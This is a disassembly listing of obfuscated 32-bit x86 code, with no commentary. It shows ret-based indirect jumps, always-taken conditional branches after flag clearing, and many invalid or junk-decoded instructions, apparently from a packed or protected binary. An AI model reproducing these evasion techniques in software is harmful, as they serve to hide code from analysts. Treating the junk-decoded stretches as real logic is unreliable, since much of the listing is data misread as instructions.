  40c675:	sbb    eax,ecx
  40c677:	iret   
  40c678:	or     eax,0x2efc3e51
  40c67d:	mov    ecx,0x40d9bc
  40c682:	nop
  40c683:	xchg   DWORD PTR [esp],ecx
  40c686:	cld    
  40c687:	ret    0x0
  40c68a:	mov    esi,0x4ba06d41
  40c68f:	(bad)  
  40c690:	mov    ch,0x7e
  40c692:	mov    al,ds:0x536013b5
  40c697:	repnz es lea ebx,ss:0x40d7a5
  40c6a0:	xchg   DWORD PTR ds:[esp],ebx
  40c6a4:	bnd ret 0x0
  40c6a8:	loope  0x40c67b
  40c6aa:	jl     0x40c6da
  40c6ac:	mov    ch,0xe1
  40c6ae:	sar    DWORD PTR [esi-0x42],1
  40c6b1:	ins    DWORD PTR es:[edi],dx
  40c6b2:	lods   al,BYTE PTR ds:[si]
  40c6b4:	or     al,0xd1
  40c6b6:	add    BYTE PTR [eax],al
  40c6b8:	data16 int3 
  40c6ba:	int3   
  40c6bb:	int3   
	...
  40c6d4:	add    BYTE PTR [eax],al
  40c6d6:	add    ch,bl
  40c6d8:	or     eax,0x324c
  40c6dd:	iret   
  40c6de:	pop    esi
  40c6df:	push   esi
  40c6e0:	cs nop
  40c6e2:	ds mov esi,0x40ac8f
  40c6e8:	xacquire xchg DWORD PTR [esp],esi
  40c6ec:	es ret 0x0
  40c6f0:	mov    al,ds:0x9f7cb5a0
  40c6f5:	or     BYTE PTR [eax],cl
  40c6f7:	cld    
  40c6f8:	jle    0x40c71b
  40c6fa:	mov    al,ds:0x14701967
  40c6ff:	dec    edi
  40c700:	jmp    0x40d4fa
  40c705:	pushf  
  40c706:	and    WORD PTR [esp],0xfe
  40c70c:	popf   
  40c70d:	jae    0x40ec83
  40c713:	mov    ch,0x82
  40c715:	jge    0x40c738
  40c717:	mov    ch,0xb5
  40c719:	mov    ch,0xe1
  40c71b:	jl     0x40c79a
  40c71d:	push   ebx
  40c71e:	dec    edx
  40c71f:	jne    0x40f0ef
  40c725:	bnd ds jmp 0x40afaa
  40c72c:	dec    ebx
  40c72d:	and    DWORD PTR [ebp+0x108267e1],esi
  40c733:	cs lahf 
  40c735:	addr16 (bad) 
  40c737:	jle    0x40c784
  40c739:	dec    ebx
  40c73a:	mov    ch,0x8
  40c73c:	dec    edx
  40c73d:	(bad)  
  40c73e:	mov    ecx,DWORD PTR [ecx+0x3c]
  40c741:	ds cld 
  40c743:	jmp    0x40cdda
  40c748:	pop    ecx
  40c749:	mov    al,ds:0xb559b5b5
  40c74e:	cs scas al,BYTE PTR es:[edi]
  40c750:	dec    ebx
  40c751:	mov    ch,0xb5
  40c753:	loope  0x40c7d1
  40c755:	mov    al,ds:0x2c598f67
  40c75a:	scas   al,BYTE PTR es:[edi]
  40c75b:	mov    ch,0x22
  40c75d:	mov    edx,ecx
  40c75f:	pushf  
  40c760:	and    WORD PTR [esp],0xfe
  40c766:	popf   
  40c767:	jae    0x40da3b
  40c76d:	mov    ch,0xbe
  40c76f:	(bad)  
  40c770:	mov    ch,0x9f
  40c772:	inc    ecx
  40c773:	jle    0x40c7c0
  40c775:	sub    al,0xa0
  40c777:	test   cl,ah
  40c779:	jge    0x40c741
  40c77b:	outs   dx,DWORD PTR ds:[esi]
  40c77c:	int3   
  40c77d:	int3   
  40c77e:	int3   
	...
  40c797:	add    BYTE PTR [eax],al
  40c799:	add    BYTE PTR [edi-0xdc104fd],dl
  40c79f:	jmp    0x40d9db
  40c7a4:	mov    ch,0xb5
  40c7a6:	mov    ch,0x6d
  40c7a8:	and    DWORD PTR [ebx+0x7d],ecx
  40c7ab:	mov    ch,0xd1
  40c7ad:	(bad)
  40c7b1:	ins    DWORD PTR es:[edi],dx
  40c7b2:	mov    ch,0xb5
  40c7b4:	addr16 jl 0x40c7d4
  40c7b7:	or     BYTE PTR [edi+0x52d23386],bl
  40c7bd:	repz repnz ss mov edx,0x40ed47
  40c7c5:	cld    
  40c7c6:	xchg   DWORD PTR [esp],edx
  40c7c9:	es ret 0x0
  40c7cd:	mov    ch,0x7c
  40c7cf:	jl     0x40c812
  40c7d1:	or     BYTE PTR [ebp-0x7c],ch
  40c7d4:	or     BYTE PTR cs:[edi-0x3333dc71],bl
  40c7db:	int3   
	...
  40c7f4:	add    BYTE PTR [eax],al
  40c7f6:	add    BYTE PTR [edi+edx*2-0x75],dl
  40c7fa:	jb     0x40c824
  40c7fc:	push   eax
  40c7fd:	cs repz repnz mov eax,0x40dbc5
  40c805:	xchg   DWORD PTR es:[esp],eax
  40c809:	repz ret 0x0
  40c80d:	sub    al,0x82
  40c80f:	adc    dh,al
  40c811:	shl    DWORD PTR [ecx],1
  40c813:	dec    ebx
  40c814:	cld    
  40c815:	mov    ch,0xbe
  40c817:	mov    esi,0x81669c53
  40c81c:	and    al,0x24
  40c81e:	inc    BYTE PTR [eax]
  40c820:	popf   
  40c821:	jae    0x40c0f6
  40c827:	jl     0x40c84a
  40c829:	mov    ch,0x2e
  40c82b:	cs loope 0x40c7dc
  40c82e:	dec    ebx
  40c82f:	cs (bad) 
  40c831:	mov    ch,0x14
  40c833:	mov    ch,0x4a
  40c835:	sbb    eax,0xf0850ffe
  40c83a:	in     al,0xff
  40c83c:	call   FWORD PTR [esi+eiz*2-0x1dbdb7f]
  40c843:	add    BYTE PTR [ebp-0x20c37cf1],bl
  40c849:	(bad)  
  40c84a:	inc    DWORD PTR [edx+0x7cb59fc6]
  40c850:	and    DWORD PTR [edi+0x22d1b5b5],ecx
  40c856:	xor    ecx,0x5f53ed98
  40c85c:	pushf  
  40c85d:	and    WORD PTR [esp],0xfe
  40c863:	popf   
  40c864:	jae    0x40d539
  40c86a:	and    DWORD PTR [eax],ecx
  40c86c:	scas   al,BYTE PTR es:[edi]
  40c86d:	sbb    eax,0xb5106db5
  40c872:	(bad)  
  40c873:	jl     0x40c832
  40c875:	xchg   ebx,eax
  40c876:	add    esi,DWORD PTR [esi+0x3c]
  40c879:	nop
  40c87a:	cs cld 
  40c87c:	jmp    0x40d8e0
  40c881:	dec    edx
  40c882:	push   ebx
  40c883:	dec    ebx
  40c884:	jge    0x40c826
  40c886:	sub    al,0xb5
  40c888:	loope  0x40c83f
  40c88a:	mov    esi,0x59677dd1
  40c88f:	(bad)  
  40c890:	and    DWORD PTR [esi+edi*2],ebp
  40c893:	mov    ch,0xa5
  40c895:	xchg   ebp,eax
  40c896:	fisttp WORD PTR [ebx+0x669c287f]
  40c89c:	and    DWORD PTR [esp],0xf9d00fe
  40c8a3:	sub    DWORD PTR [eax+0x29],0x0
  40c8a7:	add    BYTE PTR [ebp+0x67211dd1],dh
  40c8ad:	cs mov esi,0xa021b521
  40c8b3:	addr16 (bad) 
  40c8b5:	mov    cl,0xa4
  40c8b7:	out    dx,al
  40c8b8:	and    dl,0x33
  40c8bb:	repnz nop
  40c8bd:	nop
  40c8be:	jmp    0x40bc2b
  40c8c3:	or     BYTE PTR [bp+0x7d6d],bh
  40c8c8:	ins    DWORD PTR es:[edi],dx
  40c8c9:	jge    0x40c8c7
  40c8cb:	mov    ch,0x1d
  40c8cd:	mov    al,ds:0xb5d1a053
  40c8d2:	inc    ecx
  40c8d3:	dec    ebx
  40c8d4:	dec    edx
  40c8d5:	mov    ch,0xb7
  40c8d7:	shl    edx,0x5
  40c8da:	ss nop
  40c8dc:	jmp    0x40d69b
  40c8e1:	jl     0x40c93c
  40c8e3:	sbb    BYTE PTR [ecx-0x4b],0xb5
  40c8e7:	(bad)  
  40c8e8:	adc    BYTE PTR [ebp-0x51de1e4b],dh
  40c8ee:	test   BYTE PTR [edx-0x1f],cl
  40c8f1:	mov    esi,0x17fc21b5
  40c8f6:	add    eax,0x18
  40c8f9:	pushf  
  40c8fa:	and    WORD PTR [esp],0xfe
  40c900:	popf   
  40c901:	jae    0x40e513
  40c907:	scas   al,BYTE PTR es:[edi]
  40c908:	dec    ebx
  40c909:	dec    edx
  40c90a:	sbb    eax,0xb5b584a0
  40c90f:	adc    al,0xb5
  40c911:	or     BYTE PTR [edx-0x7af01022],al
  40c917:	outs   dx,BYTE PTR ds:[esi]
  40c918:	jmp    0x2e93c91c
  40c91d:	pause  
  40c91f:	mov    edx,0x40d3e0
  40c924:	xacquire xchg DWORD PTR [esp],edx
  40c928:	ds ret 0x0
  40c92c:	and    ecx,esp
  40c92e:	mov    esi,0xd1b5b5b5
  40c933:	mov    ch,dl
  40c935:	add    BYTE PTR [eax],al
  40c937:	fs push 0x53ff33ff
  40c93d:	nop
  40c93e:	ds nop
  40c940:	mov    ebx,0x40ebde
  40c945:	nop
  40c946:	xchg   DWORD PTR [esp],ebx
  40c949:	ss ret 0x0
  40c94d:	adc    BYTE PTR [ebp-0x41acbe4b],dh
  40c953:	jl     0x40c983
  40c955:	or     BYTE PTR [ecx],ah
  40c957:	and    DWORD PTR [edi+0xc1f766],eax
  40c95d:	xor    BYTE PTR [esi],ch
  40c95f:	cs nop
  40c961:	jmp    0x40b12a
  40c966:	sbb    BYTE PTR [edi-0x4af74ae3],0xde
  40c96d:	mov    ch,0x1d
  40c96f:	mov    ch,0xbe
  40c971:	mov    ch,0xb5
  40c973:	mov    ch,0x7c
  40c975:	and    DWORD PTR [edi+0x4b],esp
  40c978:	jne    0x40cb55
  40c97e:	pushf  
  40c97f:	and    WORD PTR [esp],0xfe
  40c985:	popf   
  40c986:	jae    0x40b72c
  40c98c:	ins    DWORD PTR es:[edi],dx
  40c98d:	inc    ecx
  40c98e:	mov    ch,0x7c
  40c990:	and    DWORD PTR [esi],ebp
  40c992:	test   dh,al
  40c994:	dec    ebx
  40c995:	inc    ecx
  40c996:	jae    0x40c964
  40c998:	int3   
  40c999:	int3   
	...
  40c9b2:	add    BYTE PTR [eax],al
  40c9b4:	add    BYTE PTR [edi-0x1a117bf1],ch
  40c9ba:	(bad)  
  40c9bb:	call   FWORD PTR [esi+eiz*2-0x1dbdb7f]
  40c9c2:	add    BYTE PTR [ebp+0x1032830f],bl
  40c9c8:	add    BYTE PTR [eax],al
  40c9ca:	jl     0x40ca49
  40c9cc:	(bad)  
  40c9cd:	jge    0x40c96f
  40c9cf:	fimul  WORD PTR [edi-0xb81deb6]
  40c9d5:	iret   
  40c9d6:	popa   
  40c9d7:	pushf  
  40c9d8:	and    WORD PTR [esp],0xfe
  40c9de:	popf   
  40c9df:	jae    0x40e921
  40c9e5:	mov    ch,0x1d
  40c9e7:	mov    al,ds:0xb52c1db5
  40c9ec:	ins    DWORD PTR es:[edi],dx
  40c9ed:	mov    ch,0x84
  40c9ef:	adc    al,0xb5
  40c9f1:	adc    BYTE PTR [ebp+0x7d],bh
  40c9f4:	test   DWORD PTR ds:0x240cff3f,esi
  40c9fa:	pushf  
  40c9fb:	and    WORD PTR [esp],0xfe
  40ca01:	popf   
  40ca02:	jae    0x40cd99
  40ca08:	push   ebx
  40ca09:	jge    0x40c9c0
  40ca0b:	mov    ch,0xb5
  40ca0d:	jge    0x40ca2c
  40ca0f:	adc    BYTE PTR [edi+0x41],ah
  40ca12:	mov    ch,0x7e
  40ca14:	lahf   
  40ca15:	sar    esi,0x6a
  40ca18:	inc    eax
  40ca19:	ss nop
  40ca1b:	jmp    0x40da9e
  40ca20:	adc    al,0x2e
  40ca22:	ins    DWORD PTR es:[edi],dx
  40ca23:	jle    0x40ca35
  40ca25:	mov    ch,0x2c
  40ca27:	and    DWORD PTR [ebx+0x8],ecx
  40ca2a:	lahf   
  40ca2b:	jle    0x40caaa
  40ca2d:	or     BYTE PTR [edx-0x22],cl
  40ca30:	mov    ch,0x8
  40ca32:	addr16 sub al,0xb5
  40ca35:	mov    edx,0x669cc803
  40ca3a:	and    DWORD PTR [esp],0xf9d00fe
  40ca41:	and    DWORD PTR [esi-0x2e00001f],0xffffffbe
  40ca48:	ins    DWORD PTR es:[edi],dx
  40ca49:	dec    ebx
  40ca4a:	ins    DWORD PTR es:[edi],dx
  40ca4b:	and    DWORD PTR [eax],edx
  40ca4d:	shl    DWORD PTR [ebp-0x4a21512f],1
  40ca53:	mov    ch,0xaa
  40ca55:	call   DWORD PTR [ebp+0x4]
  40ca58:	push   eax
  40ca59:	ss es cs mov eax,0x40f28d
  40ca61:	xchg   DWORD PTR ds:[esp],eax
  40ca65:	ss ret 0x0
  40ca69:	push   ebx
  40ca6a:	jge    0x40ca8d
  40ca6c:	lahf   
  40ca6d:	or     BYTE PTR [ebx-0x22],cl
  40ca70:	scas   al,BYTE PTR es:[edi]
  40ca71:	push   ebx
  40ca72:	shl    DWORD PTR [esi+0x49],1
  40ca75:	push   ebx
  40ca76:	cs ds cld 
  40ca79:	lea    ebx,ds:0x40acae
  40ca7f:	nop
  40ca80:	xchg   DWORD PTR [esp],ebx
  40ca83:	repz ret 0x0
  40ca87:	mov    ch,0x84
  40ca89:	mov    ch,0x4a
  40ca8b:	jge    0x40caaa
  40ca8d:	pop    ecx
  40ca8e:	sbb    eax,0x7cde21b5
  40ca93:	ret    0x406a
  40ca96:	nop
  40ca97:	ds jmp 0x40b5a8
  40ca9d:	pop    ecx
  40ca9e:	cld    
  40ca9f:	and    DWORD PTR [edi-0x60],esp
  40caa2:	mov    ch,0x82
  40caa4:	(bad)  
  40caa5:	mov    ch,0x53
  40caa7:	(bad)  
  40caa8:	addr16 mov ch,0x59
  40caab:	pop    ecx
  40caac:	xor    BYTE PTR [ebp-0x41d14104],0xc4
  40cab3:	inc    DWORD PTR [eax]
  40cab5:	add    dh,cl
  40cab7:	test   ecx,ecx
  40cab9:	ss cs bnd jmp 0x40a381
  40cac1:	mov    ch,0x21
  40cac3:	pop    ecx
  40cac4:	jle    0x40cb2d
  40cac6:	jle    0x40cad8
  40cac8:	mov    ch,0x8
  40caca:	mov    ch,0xb5
  40cacc:	rcr    DWORD PTR [edi-0x4a4ae2f8],1
  40cad2:	shl    DWORD PTR [ecx],1
  40cad4:	mov    ch,0xf3
  40cad6:	nop
  40cad7:	cs nop
  40cad9:	jmp    0x40c915
  40cade:	mov    ch,0x59
  40cae0:	and    DWORD PTR [ebp-0x70dee2d2],esi
  40cae6:	scas   al,BYTE PTR es:[edi]
  40cae7:	(bad)  
  40cae8:	and    DWORD PTR [ebp-0x4af75fd2],esi
  40caee:	and    DWORD PTR [ebp+0x1d],edi
  40caf1:	adc    al,0xfc
  40caf3:	sub    al,0xd6
  40caf5:	mov    ecx,DWORD PTR [edx+0x4]
  40caf8:	cs ds jmp 0x40aeed
  40caff:	scas   al,BYTE PTR es:[edi]
  40cb00:	loope  0x40cb4d
  40cb02:	jl     0x40cab9
  40cb04:	mov    ch,0x6d
  40cb06:	inc    ecx
  40cb07:	push   ebx
  40cb08:	fidivr WORD PTR [esi+0x214bde7c]
  40cb0e:	(bad)  
  40cb0f:	sbb    eax,0xd47e1421
  40cb14:	shr    dl,1
  40cb16:	push   esi
  40cb17:	pushf  
  40cb18:	and    WORD PTR [esp],0xfe
  40cb1e:	popf   
  40cb1f:	jae    0x40d745
  40cb25:	adc    al,0xc6
  40cb27:	mov    ch,0x21
  40cb29:	(bad)  
  40cb2a:	mov    esi,0x14ae4a21
  40cb2f:	or     BYTE PTR [esi+0x4b],bh
  40cb32:	(bad)  
  40cb33:	mov    ch,0x75
  40cb35:	jb     0x40cba1
  40cb37:	ins    BYTE PTR es:[edi],dx
  40cb38:	cs ds bnd jmp 0x40bbeb
  40cb40:	adc    al,0x21
  40cb42:	mov    ch,0x53
  40cb44:	scas   al,BYTE PTR es:[edi]
  40cb45:	dec    ebx
  40cb46:	or     BYTE PTR [ebp+0x41084b21],dh
  40cb4c:	mov    ch,0xb5
  40cb4e:	mov    ch,0x7e
  40cb50:	cs cld 
  40cb52:	adc    BYTE PTR [ebp+0xfb8133],dh
  40cb58:	jo     0x40cb5a
  40cb5a:	add    BYTE PTR [esi],dh
  40cb5c:	es ds jmp 0x40cff4
  40cb63:	sbb    eax,0xb521b57e
  40cb68:	mov    ch,0x7e
  40cb6a:	mov    ch,0xfc
  40cb6c:	pop    ecx
  40cb6d:	mov    ch,0x1d
  40cb6f:	sub    al,0x21
  40cb71:	(bad)  
  40cb72:	addr16 cld 
  40cb74:	ins    DWORD PTR es:[edi],dx
  40cb75:	dec    edi
  40cb76:	int3   
  40cb77:	int3   
  40cb78:	int3   
	...
  40cb91:	add    BYTE PTR [eax],al
  40cb93:	add    cl,bl
  40cb95:	push   eax
  40cb96:	fs lahf 
  40cb98:	call   DWORD PTR [ebp+0x4]
  40cb9b:	pushf  
  40cb9c:	and    WORD PTR [esp],0xfe
  40cba2:	popf   
  40cba3:	jae    0x40ccb6
  40cba9:	(bad)  
  40cbaa:	push   ebx
  40cbab:	and    DWORD PTR [ebp-0x4a6041e3],esi
  40cbb1:	dec    edx
  40cbb2:	lahf   
  40cbb3:	sub    BYTE PTR [ebp+0x21],0x5e
  40cbb7:	mov    ecx,eax
  40cbb9:	pushf  
  40cbba:	and    WORD PTR [esp],0xfe
  40cbc0:	popf   
  40cbc1:	jae    0x40b70d
  40cbc7:	(bad)  
  40cbc8:	sub    al,0x7c
  40cbca:	jle    0x40cbc8
  40cbcc:	sbb    eax,0x5321b582
  40cbd1:	loope  0x40cc01
  40cbd3:	push   ebx
  40cbd4:	inc    ecx
  40cbd5:	mov    al,0x9a
  40cbd7:	pusha  
  40cbd8:	repz repz es jmp 0x40eafe
  40cbe0:	ins    DWORD PTR es:[edi],dx
  40cbe1:	and    DWORD PTR [eax-0x3b4deec],esp
  40cbe7:	push   ebx
  40cbe8:	mov    ch,0xae
  40cbea:	loope  0x40cba1
  40cbec:	lahf   
  40cbed:	jle    0x40cc1d
  40cbef:	mov    ch,0xb5
  40cbf1:	(bad)  
  40cbf2:	(bad)  
  40cbf4:	cs retf 0x6e8b
  40cbf8:	and    al,0x9c
  40cbfa:	and    WORD PTR [esp],0xfe
  40cc00:	popf   
  40cc01:	jae    0x40bc50
  40cc07:	mov    esi,0x9f6784c6
  40cc0c:	mov    ch,0x82
  40cc0e:	mov    ch,0x84
  40cc10:	(bad)  
  40cc11:	adc    al,0xc6
  40cc13:	cld    
  40cc14:	fwait
  40cc15:	int3   
  40cc16:	int3   
  40cc17:	int3   
	...
  40cc30:	add    BYTE PTR [eax],al
  40cc32:	add    BYTE PTR [edi+0xcccccc],dl
	...
  40cc50:	add    BYTE PTR [eax],al
  40cc52:	cmp    al,0x6
  40cc54:	lods   al,BYTE PTR ds:[esi]
  40cc55:	ds cs jmp 0x40b4ac
  40cc5c:	sbb    eax,0xae41c653
  40cc61:	lahf   
  40cc62:	dec    edx
  40cc63:	jge    0x40ccb8
  40cc65:	ins    DWORD PTR es:[edi],dx
  40cc66:	jl     0x40cc70
  40cc68:	and    DWORD PTR [eax],ecx
  40cc6a:	jl     0x40cc0c
  40cc6c:	sar    DWORD PTR [esi+0x59],1
  40cc6f:	or     BYTE PTR [ebx-0x4b],cl
  40cc72:	retf   
  40cc73:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc75:	pushf  
  40cc76:	and    WORD PTR [esp],0xfe
  40cc7c:	popf   
  40cc7d:	jae    0x40d6db
  40cc83:	adc    BYTE PTR [ebx-0x61],cl
  40cc86:	mov    esi,0x2c2cb582
  40cc8b:	jl     0x40cc95
  40cc8d:	(bad)  
  40cc8e:	mov    ch,0x84
  40cc90:	mov    ch,0x1f
  40cc92:	call   DWORD PTR [ebp+0x10]
  40cc95:	pushf  
  40cc96:	and    WORD PTR [esp],0xfe
  40cc9c:	popf   
  40cc9d:	jae    0x40d196
  40cca3:	pop    DWORD PTR [edx+0x7d8fb559]
  40cca9:	inc    ecx
  40ccaa:	mov    ch,0x7e
  40ccac:	(bad)  
  40ccad:	loope  0x40ccb7
  40ccaf:	loope  0x40cccd
  40ccb1:	test   BYTE PTR [ebx-0x76390000],ah
  40ccb7:	inc    edi
  40ccb8:	loopne 0x40cc56
  40ccba:	and    WORD PTR [esp],0xfe
  40ccc0:	popf   
  40ccc1:	jae    0x40a884
  40ccc7:	inc    ecx
  40ccc8:	cs cld 
  40ccca:	ins    DWORD PTR es:[edi],dx
  40cccb:	inc    ecx
  40cccc:	sbb    BYTE PTR ds:0xb54bde10,0xb5
  40ccd3:	test   BYTE PTR [esi+0x46],dh
  40ccd6:	push   ebx
  40ccd7:	repz cld 
  40ccd9:	es mov ebx,0x40bd94
  40ccdf:	xchg   DWORD PTR ss:[esp],ebx
  40cce3:	cld    
  40cce4:	ret    0x0
  40cce7:	dec    ebx
  40cce8:	shl    DWORD PTR [ecx],1
  40ccea:	sbb    eax,0x2c7dfcb5
  40ccef:	and    DWORD PTR [ebp-0x6f95f77c],esi
  40ccf5:	pushf  
  40ccf6:	and    WORD PTR [esp],0xfe
  40ccfc:	popf   
  40ccfd:	jae    0x40ede4
  40cd03:	and    BYTE PTR [ecx],0x84
  40cd06:	cld    
  40cd07:	mov    ch,0x21
  40cd09:	test   BYTE PTR [edi-0x4a7db4b5],bl
  40cd0f:	ficom  WORD PTR [eax]
  40cd11:	adc    al,0x9c
  40cd13:	sbb    BYTE PTR [ecx+0x22],ah
  40cd16:	stos   DWORD PTR es:[edi],eax
  40cd17:	push   esi
  40cd18:	ds cs cs mov esi,0x40d5b9
  40cd20:	xchg   DWORD PTR ds:[esp],esi
  40cd24:	cld    
  40cd25:	ret    0x0
  40cd28:	(bad)  
  40cd29:	dec    edx
  40cd2a:	shl    DWORD PTR cs:[eax+0x2eaedec6],1
  40cd31:	jl     0x40cd61
  40cd33:	mov    esi,0x2ecb8bc7
  40cd38:	cld    
  40cd39:	cld    
  40cd3a:	jmp    0x40f53d
  40cd3f:	jl     0x40ccf6
  40cd41:	adc    BYTE PTR [ebx+0x4a],0xa0
  40cd45:	lahf   
  40cd46:	adc    al,0xb5
  40cd48:	lahf   
  40cd49:	sbb    eax,0x7c84a0a0
  40cd4e:	adc    al,0x8f
  40cd50:	and    DWORD PTR [edi-0x4c463cf8],ebx
  40cd56:	nop
  40cd57:	sahf   
  40cd58:	fwait
  40cd59:	pause  
  40cd5b:	jmp    0x40c638
  40cd60:	(bad)  
  40cd61:	adc    al,0xbe
  40cd63:	dec    edx
  40cd64:	lahf   
  40cd65:	ror    DWORD PTR [eax],1
  40cd67:	mov    esi,0xd1592e82
  40cd6c:	dec    ebx
  40cd6d:	push   ebx
  40cd6e:	and    DWORD PTR [bp+si-0x71],ecx
  40cd72:	test   BYTE PTR fs:[ecx],ah
  40cd75:	add    BYTE PTR [eax],al
  40cd77:	imul   esp,ebx,0xfcf3068b
  40cd7d:	cld    
  40cd7e:	jmp    0x40b3cc
  40cd83:	mov    ch,0x8
  40cd85:	mov    al,ds:0xae6d4a84
  40cd8a:	test   BYTE PTR [esi-0x60acb422],ch
  40cd90:	mov    ch,0xde
  40cd92:	(bad)  
  40cd93:	scas   al,BYTE PTR es:[edi]
  40cd94:	or     BYTE PTR [esi-0xd90a42],bh
  40cd9a:	or     al,0x24
  40cd9c:	cld    
  40cd9d:	ds repz jmp 0x40f3f7
  40cda4:	mov    al,ds:0x7d824b84
  40cda9:	mov    ch,0x10
  40cdab:	xor    BYTE PTR [ebp-0x4aebebad],0xde
  40cdb2:	push   ebx
  40cdb3:	push   ebx
  40cdb4:	sbb    eax,0xf1c1b5de
  40cdb9:	push   edx
  40cdba:	call   DWORD PTR [edi-0x20]
  40cdbd:	push   ebx
  40cdbe:	nop
  40cdbf:	cld    
  40cdc0:	repz mov ebx,0x40f583
  40cdc6:	xchg   DWORD PTR ss:[esp],ebx
  40cdca:	es ret 0x0
  40cdce:	cmp    BYTE PTR [esi-0x4b],0x8f
  40cdd2:	mov    ch,0x1d
  40cdd4:	and    DWORD PTR ds:0xd239c684,ebx
  40cdda:	xor    edx,edx
  40cddc:	ds ds nop
  40cddf:	jmp    0x40b5c9
  40cde4:	inc    ecx
  40cde5:	cs mov ch,0x2e
  40cde8:	jge    0x40ce2b
  40cdea:	ins    DWORD PTR es:[edi],dx
  40cdeb:	push   ebx
  40cdec:	and    DWORD PTR [eax],edx
  40cdee:	or     BYTE PTR [eax+edx*1],ch
  40cdf1:	cld    
  40cdf2:	scas   al,BYTE PTR es:[edi]
  40cdf3:	mov    ch,0xb5
  40cdf5:	cld    
  40cdf6:	mov    ch,0x7e
  40cdf8:	mov    eax,0x3de11a0
  40cdfd:	sti    
  40cdfe:	cs cs jmp 0x40f2f2
  40ce05:	ins    DWORD PTR es:[edi],dx
  40ce06:	ins    DWORD PTR es:[edi],dx
  40ce07:	mov    ch,0xb5
  40ce09:	mov    ch,0xa0
  40ce0b:	(bad)  
  40ce0c:	adc    BYTE PTR [esi+ebp*4-0x60],bh
  40ce10:	cs pop ecx
  40ce12:	or     BYTE PTR [esi-0x4b],bh
  40ce15:	push   ebx
  40ce16:	mov    al,ds:0x237d0821
  40ce1b:	test   ecx,ecx
  40ce1d:	ds ds repz jmp 0x40a9c9
  40ce25:	mov    ch,0x7c
  40ce27:	mov    ch,0x9f
  40ce29:	addr16 jl 0x40ce4d
  40ce2c:	mov    ch,0x2c
  40ce2e:	adc    al,0x8
  40ce30:	jle    0x40ce5e
  40ce32:	cs mov esi,0xb5e1fc53
  40ce38:	mov    ch,0xc0
  40ce3a:	imul   eax,DWORD PTR [eax],0xf675d00
  40ce40:	test   BYTE PTR [ebx],al
  40ce42:	hlt    
  40ce43:	(bad)  
  40ce44:	call   DWORD PTR [eax-0x7f16c104]
  40ce4a:	loop   0x40ce4b
  40ce4c:	dec    DWORD PTR [edi-0x1ef782bf]
  40ce52:	inc    ecx
  40ce53:	dec    edx
  40ce54:	inc    ecx
  40ce55:	cs sbb eax,0x2cb582b5
  40ce5b:	(bad)  
  40ce5c:	mov    ch,0x1a
  40ce5e:	mov    eax,DWORD PTR [ebx+0x3c]
  40ce61:	push   edx
  40ce62:	ss es lea edx,cs:0x40ac13
  40ce6b:	xchg   DWORD PTR es:[esp],edx
  40ce6f:	ds ret 0x0
  40ce73:	mov    esi,0x7de121b5
  40ce78:	lahf   
  40ce79:	ins    DWORD PTR es:[edi],dx
  40ce7a:	pop    ecx
  40ce7b:	rcr    DWORD PTR [eax-0x6b16b0c7],1
  40ce81:	stc    
  40ce82:	(bad)  
  40ce83:	call   FWORD PTR [esi+eiz*2-0x1dbdb7f]
  40ce8a:	add    BYTE PTR [ebp-0x213e7cf1],bl
  40ce90:	(bad)  
  40ce91:	call   DWORD PTR [esi+ebx*8]
  40ce94:	push   ebx
  40ce95:	cld    
  40ce96:	cs (bad) 
  40ce98:	rcl    DWORD PTR [ebx+0x7c],1
  40ce9b:	and    DWORD PTR [ecx+0x68],eax
  40ce9e:	add    BYTE PTR [ebx-0x6380000],al
  40cea4:	add    BYTE PTR [eax],al
  40cea6:	aas    
  40cea7:	push   esp
  40cea8:	pushf  
  40cea9:	and    WORD PTR [esp],0xfe
  40ceaf:	popf   
  40ceb0:	jae    0x40e063
  40ceb6:	jge    0x40ce6d
  40ceb8:	mov    ch,0xfc
  40ceba:	mov    ch,0x4b
  40cebc:	scas   al,BYTE PTR es:[edi]
  40cebd:	fimul  WORD PTR [edx+0x8]
  40cec0:	dec    edx
  40cec1:	and    esp,edi
  40cec3:	inc    ecx
  40cec4:	jge    0x40ce50
  40cec6:	push   0x40
  40cec8:	pushf  
  40cec9:	and    WORD PTR [esp],0xfe
  40cecf:	popf   
  40ced0:	jae    0x40d172
  40ced6:	mov    al,ds:0xde9f6de1
  40cedb:	scas   al,BYTE PTR es:[edi]
  40cedc:	test   BYTE PTR [eax],cl
  40cede:	cld    
  40cedf:	cs cs sub al,0x7e
  40cee3:	mov    ch,0xfc
  40cee5:	mov    bl,0x5e
  40cee7:	push   ecx
  40cee8:	repnz repz ds mov ecx,0x40c371
  40cef0:	nop
  40cef1:	xchg   DWORD PTR [esp],ecx
  40cef4:	repz ret 0x0
  40cef8:	pop    ecx
  40cef9:	mov    ch,0xfc
  40cefb:	test   BYTE PTR [ebp-0x4ab5acb5],dh
  40cf01:	lahf   
  40cf02:	adc    cl,0xca
  40cf05:	xor    DWORD PTR [esp],eax
  40cf08:	push   ebx
  40cf09:	repnz es repnz mov ebx,0x40ae8d
  40cf11:	nop
  40cf12:	xchg   DWORD PTR [esp],ebx
  40cf15:	cs ret 0x0
  40cf19:	ins    DWORD PTR es:[edi],dx
  40cf1a:	adc    BYTE PTR [eax-0x60b4dead],ah
  40cf20:	(bad)  
  40cf21:	mov    ch,0x2c
  40cf23:	jl     0x40cee9
  40cf25:	sub    al,0x0
  40cf27:	add    BYTE PTR [edi],ah
  40cf29:	int3   
  40cf2a:	int3   
  40cf2b:	int3   
	...
  40cf44:	add    BYTE PTR [eax],al
  40cf46:	add    BYTE PTR [eax],cl
  40cf48:	js     0x40cf4a
  40cf4a:	add    BYTE PTR [ebp+eiz*8+0x44],dl
  40cf4e:	dec    esp
  40cf4f:	add    BYTE PTR [eax],al
  40cf51:	ds sub ecx,0x1e
  40cf55:	ss cs jmp 0x40ca74
  40cf5c:	and    DWORD PTR [esp+edi*8-0x51f7de7e],eax
  40cf63:	mov    ch,0xb5
  40cf65:	mov    al,ds:0x9f2ee1b5
  40cf6a:	or     BYTE PTR [esi+0x6d],bh
  40cf6d:	or     BYTE PTR [ecx],ah
  40cf6f:	xor    BYTE PTR [ebx-0x1603c118],0xc2
  40cf76:	cmc    
  40cf77:	(bad)  
  40cf78:	dec    DWORD PTR [edx-0x4b]
  40cf7b:	mov    ch,0xb5
  40cf7d:	or     BYTE PTR [ecx],ah
  40cf7f:	or     BYTE PTR [edi+0x7ea07ed1],bl
  40cf85:	(bad)  
  40cf86:	dec    edx
  40cf87:	(bad)  
  40cf88:	mov    esi,0xe15941b5
  40cf8d:	addr16 sar eax,1
  40cf90:	popa   
  40cf91:	rcr    BYTE PTR [ebx+0x0],0x0
